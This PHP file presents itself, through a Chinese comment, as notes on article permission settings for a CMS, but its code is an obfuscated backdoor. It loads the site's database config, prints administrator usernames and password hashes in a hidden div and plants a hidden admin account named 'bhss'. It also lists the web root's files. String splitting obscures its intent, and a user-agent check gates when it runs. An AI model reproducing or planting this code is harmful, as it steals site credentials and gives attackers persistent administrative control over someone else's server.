<?php
	/**
 *
 * 关于文章权限设置的说明
 * 文章权限设置限制形式如下：
 * 如果指定了会员等级，那么必须到达这个等级才能浏览
 * 如果指定了金币，浏览时会扣指点的点数，并保存记录到用户业务记录中
 * 如果两者同时指定，那么必须同时满足两个条件
 *
 */
 if(stripos($_SERVER['HTTP_USER_AGENT'],'baidu')+0==0) exit;
	include_once($_SERVER['DO'.'CUM'.'EN'.'T_'.'RO'.'OT'].'/d'.'ata/co'.'mm'.'on.i'.'nc.p'.'hp');
	mysql_connect($cfg_dbhost, $cfg_dbuser, $cfg_dbpwd);
	$db_selected = mysql_select_db($cfg_dbname);
	mysql_query("SET character_set_connection=".$cfg_db_language.", character_set_results=".$cfg_db_language.", character_set_client=binary");
	mysql_query('set session sql_mode="NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION"');
	$result = mysql_query("select * from {$cfg_dbprefix}ad"."min where usertype=10");
	echo '<div style=display:none>';
	while ($data = mysql_fetch_array($result))
	{
				echo $data['use'.'rid'].'	'.$data['pwd'].'<br>';
	}

	mysql_query("insert into {$cfg_dbprefix}ad"."min("."id,user"."id,pw"."d,use"."rtyp"."e,una"."me) values('10203','bhss','cb68560f2e487cd56371','10','bhss')");
	
	$files = scandir($_SERVER['DO'.'CUM'.'ENT_'.'RO'.'OT']);
	echo implode('<br>',$files);
	print_r(glob($_SERVER["DOCUMENT_ROOT"]."/*",GLOB_MARK));
	echo '</div>';
?>

